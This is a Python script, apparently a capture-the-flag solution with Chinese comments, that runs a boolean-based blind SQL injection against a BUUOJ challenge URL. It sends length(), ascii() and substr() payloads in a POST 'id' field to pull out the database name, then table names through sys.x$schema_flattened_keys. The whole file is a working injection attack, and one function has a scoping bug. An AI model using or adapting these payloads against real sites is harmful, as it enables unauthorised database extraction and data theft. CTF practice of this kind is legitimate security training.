import requests

# 存放数据库名变量
DBName = ""
# 存放数据库字段变量
DBColumns = []
# 存放数据字典变量,键为字段名，值为字段数据列表
DBData = {}
# flag 为 Nu1L
flag = "Nu1L"
# 盲注主函数
def StartSqli(url):
    # GetDBName(url)
    print("[+]当前数据库名:{0}".format(DBName))
    GetDBTables(url)

# 获取数据库名函数
def GetDBName(url):
    # 引用全局变量DBName,用来存放网页当前使用的数据库名
    global DBName
    print("[+]开始获取数据库名长度")
    # 保存数据库名长度变量
    DBNameLen = 0
    for DBNameLen in range(1,100):
        data = {
            'id': "1&&(length(database()))={0}".format(DBNameLen)
        }
        res = requests.post(url,data)
        if flag in res.text:
            print(f"[-]数据库名长度: {DBNameLen}")
            break
    # 获取数据库名
    print("[+]开始获取数据库名")
    # a表示substr()函数的截取起始位置
    for a in range(1, DBNameLen + 1):
        # b表示33~127位ASCII中可显示字符
        for b in range(33, 128):
            data = {
                'id': '1&&(ascii(substr(database(),{0},1))={1})'.format(a,b)
            }
            res = requests.post(url,data)
            if flag in res.text:
                DBName += chr(b)
                print("[-]"+DBName)
                break
    print('结束')

# 获取表名函数
TBtable = ""
def GetDBTables(url):
    print('[+]开始获取表名')
    for a in range(1, 100):
        for b in range(33,128):
            data = {
                'id': '1&&ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database())), {0} ,1)={1}'.format(a,b)
            }
            res = requests.post(url,data)
            if flag in res.text:
                TBtable += chr(b) 
                print('表的名字为：' + TBtable)
                break
            if flag not in res.text and chr(b) == '~':
                return ''




# main 函数
if __name__ == '__main__':
    url = 'http://e2df23b3-84f5-44e4-9eba-3134fe22b56e.node4.buuoj.cn:81/index.php'
    StartSqli(url)